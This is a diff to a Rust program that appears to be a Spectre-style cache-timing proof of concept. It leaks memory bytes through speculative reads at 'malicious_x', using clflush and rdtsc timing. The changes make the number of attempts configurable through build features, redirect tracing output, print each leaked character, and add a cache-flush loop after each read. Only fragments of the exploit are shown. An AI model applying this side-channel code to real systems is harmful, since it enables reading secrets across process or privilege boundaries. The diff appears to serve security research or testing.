@@ -11,6 +11,15 @@ use std::arch::x86_64::_rdtsc;
 const THRESHOLD: u64 = 160;
 const STRIDE: usize = 1024;
 
+#[cfg(feature = "small")]
+const TRIES: usize = 1000;
+#[cfg(feature = "medium")]
+const TRIES: usize = 10000;
+#[cfg(feature = "large")]
+const TRIES: usize = 100000;
+#[cfg(feature = "extra")]
+const TRIES: usize = 1000000;
+
 const data_size: usize = 16;
 static mut public_data: [u8; 160] = [2; 160];
 
@@ -60,7 +69,7 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         latencies[i] = 0;
         scores[i] = 0;
     }
-    for i in 0..200000 {
+    for i in 0..TRIES {
         // flush lines clflush
         // PRIME
         for j in 0..256 {
@@ -170,13 +179,19 @@ pub fn main() {
         let ch2 = value[1] as u8 as char;
 
         #[cfg(feature = "tracing")]
-        println!(
+        eprintln!(
             // The value as char
             "Reading at malicious_x {} = {}:{}:{} (second {} {})",
             j, ch, value[0], score[0], score[1], value[1]
         );
 
-        #[cfg(not(feature = "tracing"))]
-        println!("{}", ch);
+        //#[cfg(not(feature = "tracing"))]
+        print!("{}", ch);
+        // PRIME
+        for j in 0..256 {
+            unsafe {
+                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
+            }
+        }
     }
 }
